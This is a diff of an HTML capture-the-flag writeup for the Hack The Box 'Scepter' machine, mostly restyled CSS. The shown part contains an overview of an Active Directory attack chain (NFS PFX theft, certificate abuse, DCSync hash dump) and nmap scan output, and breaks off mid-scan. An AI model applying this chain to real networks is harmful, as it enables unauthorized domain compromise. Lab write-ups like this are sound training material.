@@ -3,353 +3,72 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: Scepter Writeup — Hackthekat</title>
   <meta name="description" content="HTB Scepter machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      scepter
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>scepter</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
@@ -361,93 +80,83 @@
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>Scepter</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-hard">Hard</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-windows">Windows</span></td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>Scepter is a Hard difficulty Windows AD machine exposing <strong>NFS</strong> and <strong>SMB</strong> shares. The attack begins with mounting a publicly accessible NFS helpdesk share containing PFX certificate files. After cracking the PFX password and forging a new certificate, authentication to AD is performed via certipy. The escalation chains through <strong>BloodHound AD path abuse</strong>, <strong>ESC certificate attacks</strong>, and ultimately a <strong>DCSync</strong> to dump the Administrator hash.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
-      <div class="code-block"><pre><code>nmap -p- 10.129.6.202 
+      <div class="code-block"><pre><code>nmap -p- 10.129.6.202               
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-29 22:44 CEST
 Nmap scan report for 10.129.6.202
 Host is up (0.018s latency).
 Not shown: 65506 closed tcp ports (reset)
-PORT STATE SERVICE
-53/tcp open domain
-88/tcp open kerberos-sec
-111/tcp open rpcbind
-135/tcp open msrpc
-139/tcp open netbios-ssn
-389/tcp open ldap
-445/tcp open microsoft-ds
-464/tcp open kpasswd5
-593/tcp open http-rpc-epmap
-636/tcp open ldapssl
-2049/tcp open nfs
-3268/tcp open globalcatLDAP
-3269/tcp open globalcatLDAPssl
-5985/tcp open wsman
-5986/tcp open wsmans
-9389/tcp open adws
-47001/tcp open winrm
-49664/tcp open unknown
-49665/tcp open unknown
-49666/tcp open unknown
-49667/tcp open unknown
-49669/tcp open unknown
-49678/tcp open unknown
-49679/tcp open unknown
-49680/tcp open unknown
-49683/tcp open unknown
-49696/tcp open unknown
-49714/tcp open unknown
-49722/tcp open unknown
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+111/tcp   open  rpcbind
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+2049/tcp  open  nfs
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+5986/tcp  open  wsmans
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49678/tcp open  unknown
+49679/tcp open  unknown
+49680/tcp open  unknown
+49683/tcp open  unknown
+49696/tcp open  unknown
+49714/tcp open  unknown
+49722/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 20.87 seconds</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
+      <p>A detailed service-version scan (<code>-sCV</code>) fingerprints the exact software versions running on each open port, helping identify potential vulnerabilities.</p>
       <div class="code-block"><pre><code>nmap -p53,88,111,135,139,389,445,464,593,636,2049,3268,3269,5985,5986,9389,47001,49664,49665,49666,49667,49669,49678,49679,49680,49683,49696,49714,49722 -sCV 10.129.6.202 -vvvv
 Scanned at 2025-04-29 22:47:08 CEST for 79s
 
-PORT STATE SERVICE REASON VERSION
-53/tcp open domain syn-ack ttl 127 Simple DNS Plus
-88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-30 01:50:08Z)
-111/tcp open rpcbind syn-ack ttl 127 2-4 (RPC #100000)
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-30 01:50:08Z)
+111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
 | rpcinfo: 
-| program version port/proto service
-| 100000 2,3,4 111/tcp rpcbind
-| 100000 2,3,4 111/tcp6 rpcbind
-| 100000 2,3,4 111/udp rpcbind
-| 100000 2,3,4 111/udp6 rpcbind
-| 100003 2,3 2049/udp nfs
-| 100003 2,3 2049/udp6 nfs
-| 100003 2,3,4 2049/tcp nfs
-| 100003 2,3,4 2049/tcp6 nfs
-| 100005 1,2,3 2049/tcp mountd
-| 100005 1,2,3 2049/tcp6 mountd
-| 100005 1,2,3 2049/udp mountd
-| 100005 1,2,3 2049/udp6 mountd
-| 100021 1,2,3,4 2049/tcp nlockmgr
-| 100021 1,2,3,4 2049/tcp6 nlockmgr
-| 100021 1,2,3,4 2049/udp nlockmgr
-| 100021 1,2,3,4 2049/udp6 nlockmgr
-| 100024 1 2049/tcp status
-| 100024 1 2049/tcp6 status
-| 100024 1 2049/udp status
-|_ 100024 1 2049/udp6 status
-135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-04-30T01:51:19+00:00; +5h03m01s from scanner time.
 | ssl-cert: Subject: commonName=dc01.scepter.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb
@@ -456,13 +165,13 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2024-11-01T03:22:33
-| Not valid after: 2025-11-01T03:22:33
-| MD5: 2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
+| Not valid after:  2025-11-01T03:22:33
+| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
 | SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9
-445/tcp open microsoft-ds? syn-ack ttl 127
-464/tcp open kpasswd5? syn-ack ttl 127
-593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: commonName=dc01.scepter.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb
 | Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
@@ -470,12 +179,12 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2024-11-01T03:22:33
-| Not valid after: 2025-11-01T03:22:33
-| MD5: 2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
+| Not valid after:  2025-11-01T03:22:33
+| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
 | SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9
 |_ssl-date: 2025-04-30T01:51:19+00:00; +5h03m02s from scanner time.
-2049/tcp open nlockmgr syn-ack ttl 127 1-4 (RPC #100021)
-3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
+2049/tcp  open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-04-30T01:51:19+00:00; +5h03m01s from scanner time.
 | ssl-cert: Subject: commonName=dc01.scepter.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb
@@ -484,10 +193,10 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2024-11-01T03:22:33
-| Not valid after: 2025-11-01T03:22:33
-| MD5: 2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
+| Not valid after:  2025-11-01T03:22:33
+| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
 | SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9
-3269/tcp open ssl/ldap syn-ack ttl 127
+3269/tcp  open  ssl/ldap      syn-ack ttl 127
 |_ssl-date: 2025-04-30T01:51:19+00:00; +5h03m02s from scanner time.
 | ssl-cert: Subject: commonName=dc01.scepter.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb
@@ -496,13 +205,13 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2024-11-01T03:22:33
-| Not valid after: 2025-11-01T03:22:33
-| MD5: 2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
+| Not valid after:  2025-11-01T03:22:33
+| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
 | SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9
-5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
-5986/tcp open ssl/http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_ssl-date: 2025-04-30T01:51:19+00:00; +5h03m02s from scanner time.
 | ssl-cert: Subject: commonName=dc01.scepter.htb
 | Subject Alternative Name: DNS:dc01.scepter.htb
@@ -511,54 +220,53 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2024-11-01T00:21:41
-| Not valid after: 2025-11-01T00:41:41
-| MD5: e84c:6894:816e:b7f5:4338:0a1f:a896:2075
+| Not valid after:  2025-11-01T00:41:41
+| MD5:   e84c:6894:816e:b7f5:4338:0a1f:a896:2075
 | SHA-1: 4e58:3799:020d:aaf4:d5ce:0c1e:76db:32cd:5a0e:28a7
 |_http-title: Not Found
 | tls-alpn: 
-|_ http/1.1
+|_  http/1.1
 |_http-server-header: Microsoft-HTTPAPI/2.0
-9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing
-47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
-49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49666/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49669/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49678/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-49679/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49680/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
